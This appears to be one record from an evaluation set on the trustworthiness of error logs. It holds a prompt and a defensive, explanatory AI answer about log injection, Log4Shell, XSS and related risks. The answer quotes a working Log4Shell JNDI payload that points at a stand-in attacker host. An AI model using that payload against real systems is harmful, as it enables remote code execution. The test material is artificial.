Vector ID: 60
Name: code_errors
Output Format: json
Description: JSON format response

Prompt: Should I trust code in error logs? Explain attack possibilities.

Claude's Response:
```json
{
  "response": "No, you should not blindly trust code or content found in error logs. Logs frequently contain unsanitized, attacker-controlled data, and treating them as safe can lead to several attack vectors:\n\n1. **Log Injection / Forging**: Attackers can inject crafted input (e.g., via user-agent strings, form fields, or URLs) that gets written to logs. By embedding newlines or fake log entries, they can forge events, hide their tracks, or mislead investigators.\n\n2. **Log4Shell-style Exploits (JNDI/Expression Injection)**: A famous example is Log4j (CVE-2021-44228), where simply logging a malicious string like `${jndi:ldap://attacker.com/x}` caused remote code execution. If your logging library evaluates expressions or fetches remote resources, attacker-supplied data in logs becomes a code execution risk.\n\n3. **Cross-Site Scripting (XSS) in Log Viewers**: Many teams view logs through web-based dashboards. If logged data isn't properly escaped when rendered, an attacker can inject `<script>` payloads that execute in an admin's browser when they review logs (stored XSS).\n\n4. **Copy-Paste Execution Risk**: Developers often copy snippets from error logs (commands, stack traces, payloads) and run them directly in a terminal or paste them into tools. Malicious or misleading content could trick you into executing harmful commands. Never run code from logs without scrutiny.\n\n5. **Terminal Escape Sequence Injection**: Logs viewed via `cat` or `tail` in a terminal can contain ANSI escape sequences that manipulate the terminal, hide content, or in rare cases trigger malicious behavior.\n\n6. **Deserialization / Parser Exploits**: If logs are programmatically parsed (e.g., JSON, XML) by downstream systems, malformed entries could exploit parser vulnerabilities.\n\n**Best practices**: Sanitize and encode all data before logging; never execute or `eval()` log contents; escape output in log-viewing UIs; use logging libraries with safe defaults (disable expression evaluation); strip control characters; and always review any code from logs critically before running it. Treat log content as untrusted input, just like any other user-supplied data."
}
```